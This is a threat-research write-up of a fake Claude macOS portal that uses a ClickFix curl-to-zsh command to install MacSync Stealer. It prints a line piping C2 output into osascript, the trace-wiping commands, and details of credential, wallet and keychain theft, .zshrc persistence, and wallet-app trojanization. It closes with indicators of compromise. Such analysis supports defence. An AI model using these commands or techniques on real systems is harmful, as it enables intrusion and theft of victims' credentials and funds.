---
layout: single
title: Fake Claude - MacSync Stealer
excerpt: "With AI tools becoming increasingly popular, everyone now wants access to them, often without questioning their source. As a result, attackers take advantage of this demand by distributing “AI tools” from untrusted websites. In this case, we are looking at a campaign specifically designed to impersonate Claude in order to trick users into installing what appears to be a legitimate macOS version of the application. The fake page guides victims into executing a ClickFix command under the guise of a normal installation step. On macOS, that single command triggers a multi-stage infection chain, ultimately deploying MacSync Stealer."
date: 2026-05-27
classes: wide
header:
  teaser: /assets/images/FakeClaude/fakeClaudePost.png
  teaser_home_page: true
  icon: /assets/images/malware_icon.webp
categories:
  - Fake Claude
  - infosec
tags: 
  - Mac
  - Stealer
---

With AI tools becoming increasingly popular, everyone now wants access to them, often without questioning their source. Attackers take advantage of this by distributing fake "AI tools" from untrusted sites, in this case, a campaign impersonating Claude to trick macOS users into running what looks like a normal installation step. That ClickFix command is a `curl` fetching a remote `zsh` script and piping it directly into the shell, no user confirmation, no download prompt.

That first script is obfuscated, and buried inside it is a second obfuscated `zsh` payload retrieved via another `curl`. This second stage is what does the damage — it drops and executes MacSync Stealer, going after browser credentials, session cookies, crypto wallets, and keychain data.

<p align="center">
<img src="/assets/images/FakeClaude/resumeClaude.png">
</p>

## First Stage
Threat actors have been observed deploying fake AI portals to lure victims into executing malicious commands on their machines. In this campaign, attackers impersonated Claude's official website through the domain `claudecode-ai[.]netlify[.]app` to target macOS users, tricking them into running commands that silently delivered malware — all while believing they were simply setting up a legitimate AI assistant.
<p align="center">
<img src="/assets/images/FakeClaude/fakeClaudePortal.png">
</p>


Once on the fake portal, the site immediately filters its victims by claiming that **a Mac is required** to proceed, a deliberate trick that adds legitimacy while ensuring the payload only reaches the intended platform. Victims are then prompted to open a terminal and run what appears to be a standard installation command. To evade static detection, the URL is Base64-encoded and decoded at runtime via a pipeline before being passed directly to `curl`, which fetches the next stage and pipes it into `zsh` for immediate execution:
<p align="center">
<img src="/assets/images/FakeClaude/cmdCommandClaude.png">
</p>
> **Important**: In case the request does not come from `curl` on a macOS machine, the C2 will respond with a **502 error** — a server-side filter that ensures the payload is only delivered to the intended targets.

## Second Stage

The script fetched by `curl` is not plaintext, it is a Base64-encoded payload which, once decoded, reveals a `gzip`-compressed bundle that is decompressed on the fly and executed directly in memory:
<p align="center">
<img src="/assets/images/FakeClaude/secondStage.png">
</p>

Once deobfuscated, the second stage reveals another `zsh` script responsible for several tasks. One of them performs an additional `curl` request to the C2, and pipes the response directly into `osascript`, which confirms that the next payload is an **AppleScript**:
```bash
curl -k -s --max-time 30 \
    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
    -H "api-key: $api_key" \
    "http://spotlessridesdetailing[.]com/dynamic?txd=$token" | osascript
```

At this stage of execution, however, the upload routine cannot yet fully operate because the required archive (/tmp/osalogging.zip) has not been created. That archive is generated later by the AppleScript payload. 
<p align="center">
<img src="/assets/images/FakeClaude/secondStageDeobfuscated.png">
</p>

## Third Stage
The AppleScript executed through `osascript` turned out to be far more than a simple utility script. Embedded inside was a fully featured information stealer known internally as **MacSync Stealer** (`Build Tag: claude 3`, version `1.1.2_release`). 

### Persistence via `.zshrc`
Before anything else, the script checks for Full Disk Access (FDA) permissions by attempting to list `~/Library/Cookies/`. If access is denied, it falls back to a persistence mechanism, injecting itself into `.zshrc` so the next time the user opens a terminal, the entire infection chain re-executes:
<p align="center">
<img src="/assets/images/FakeClaude/persistanceClaude.png">
</p>


### Victim fingerprinting
The script collects a full system profile and writes it to a `writemind` staging directory under `/tmp/sync<random7digits>/`:

```applescript
writeText("MacSync Stealer\n\n", writemind & "info")
writeText("Build Tag: claude 3\n", writemind & "info")
system_profiler SPSoftwareDataType   -- OS version, hostname
system_profiler SPHardwareDataType   -- CPU, RAM, serial number
system_profiler SPDisplaysDataType   -- GPU, display info
```
It also captures the username and attempts to retrieve the macOS login password via `dscl . authonly`, validating credentials silently. If the password is empty (no password set), it proceeds anyway. If not, it loops a fake "System Preferences" dialog until the victim enters the correct password, again using Apple's own `LockedIcon.icns` to appear legitimate. Once validated, it immediately uses the password to unlock the login keychain and extract the **Chrome Safe Storage** master key.

### Browser credential theft


The stealer targets every major Chromium-based browser installed on the system:

- Chrome, Chrome Beta, Chrome Canary, Chrome Dev
- Brave, Edge, Vivaldi, Opera, OperaGX
- Arc, Yandex, Coccoc, Chromium

For each browser and each profile (`Default`, `Profile 1`, etc.), it copies:

- `Cookies` / `Network/Cookies`
- `Web Data` (autofill, credit cards)
- `Login Data` (saved passwords)
- Extension local storage and IndexedDB

For Gecko-based browsers (Firefox, Zen, LibreWolf, Waterfox) it targets:

- `key4.db` and `cert9.db` — credential and certificate stores
- `logins.json` and `logins-backup.json` — saved passwords
- `cookies.sqlite`, `formhistory.sqlite`, `places.sqlite`
<p align="center">
<img src="/assets/images/FakeClaude/browsersClaude.png">
</p>

### Crypto wallet exfiltration

The stealer ships with an extensive list of browser extension IDs targeting crypto wallet. Over 80 extensions covering MetaMask, Phantom, Ledger, Trezor, Coinbase Wallet, Trust Wallet, and many others, grabbing their `Local Extension Settings` and `IndexedDB` data from every browser profile.

For desktop wallets it targets the application data directories directly:

- Exodus, Electrum, Atomic Wallet, Guarda, Coinomi
- Sparrow, Wasabi, Bitcoin Core, Armory, Electron Cash
- Monero, Litecoin Core, Dash Core, Dogecoin Core
- BlueWallet, Zengo, Trust Wallet, Ledger Live, Trezor Suite
<p align="center">
<img src="/assets/images/FakeClaude/walletsClaude.png">
</p>

### Additional collection

Beyond browsers and wallets, the stealer also grabs:

- **Telegram Desktop** session data (`tdata/`)
- **macOS Keychains** (`*.keychain-db`) - contains saved Wi-Fi passwords, app credentials, and certificates
- **Cloud credentials** - `.ssh/`, `.aws/`, `.kube/` - targeting developers and cloud infrastructure access
- **Shell history and config** - `.zshrc`, `.zsh_history`, `.bash_history`, `.gitconfig`
- **Files from Desktop, Documents and Downloads** matching extensions: `pdf`, `docx`, `doc`, `wallet`, `key`, `keys`, `db`, `txt`, `seed`, `rtf`, `kdbx`, `pem`, `ovpn`
- **Safari cookies** and **Apple Notes** database (`NoteStore.sqlite`)
- **Running processes** via `lsappinfo list` and `ps ax`

### Exfiltration
Once collection is complete, all staged data is compressed into a single ZIP archive with the name `osalogging.zip`:

```bash
ditto -c -k --sequesterRsrc /tmp/sync/ /tmp/osalogging.zip
```

After packaging, the staging directory is wiped to minimise forensic traces:

```bash
rm -rf /tmp/sync*
rmdir /tmp/macsync_.lock
```

<p align="center">
<img src="/assets/images/FakeClaude/compressedData.png">
</p>


The workflow does not end once the archive is created. After packaging the collected data into `osalogging.zip`, the malware relies on the persistence mechanism injected into `.zshrc` to re-execute the previously deployed zsh stage the next time the victim opens a terminal session. At that point, the second-stage loader is executed again through the malicious `curl ... | zsh` command. Unlike the earlier execution, the required runtime context now exists: the AppleScript has already completed data collection and generated `/tmp/osalogging.zip`, allowing the zsh component to proceed with exfiltration to the C2 infrastructure. 

The script contains dedicated logic implementing a chunked upload mechanism, splitting files into 10MB blocks and sending them to the `/gate` endpoint via HTTP `PUT` requests, with retry logic of up to 8 attempts per chunk. This staged design separates collection and packaging from networking and exfiltration, with the AppleScript acting as the stealer component while the zsh stage handles communication with the remote server. After successful upload, the malware removes the ZIP archive and temporary staging directories from `/tmp/` in an apparent attempt to minimise forensic traces left on the system.

### Trojanization of Ledger Live and Trezor Suite

Finally, the malware also contains dedicated functionality targeting existing Ledger and Trezor wallet software already installed on the victim’s machine. Unlike the earlier routines focused on credential theft and wallet data collection, this component actively modifies trusted cryptocurrency applications in place, effectively trojanizing them.

The script specifically targets:

- `Ledger Wallet.app`
- `Ledger Live.app`
- `Trezor Suite.app`

located under `/Applications/`.

For each application, the malware first verifies whether it is installed on the system. If present, it downloads additional archives from the attacker-controlled infrastructure containing replacement `app.asar` and `Info.plist` files, two critical components of Electron-based macOS applications.

This is particularly significant because `app.asar` contains the actual application logic and JavaScript code executed by the wallet software. By replacing this file, the attackers can effectively inject arbitrary malicious functionality directly into the legitimate application while preserving its normal appearance and user workflow.

After downloading and extracting the archive under `/tmp/`, the malware replaces the original application resources inside the legitimate app bundle:

- `Contents/Resources/app.asar`
- `Contents/Info.plist`

The script then re-signs the modified application using:

```applescript
codesign -f -s -
```
> **Important**: It was not possible to recover the malicious Ledger and Trezor replacement scripts because the attacker-controlled C2 infrastructure was already offline at the time of analysis.

## 🔍Indicators of Compromise (IOCs)
### SHA256 Hashes
0b3cccf43943dfbf723ec4884d0328725b10554151521b3255e6f21c5753a6b8 - stage2.zsh
984ada8ec078ce7ba901ce0c364c84252b7d4bccca09d9d1a6fa7d4d61b54fd2 - stage3.applescript

### Domains
claudecode-ai[.]netlify[.]app<br>
spotlessridesdetailing[.]com
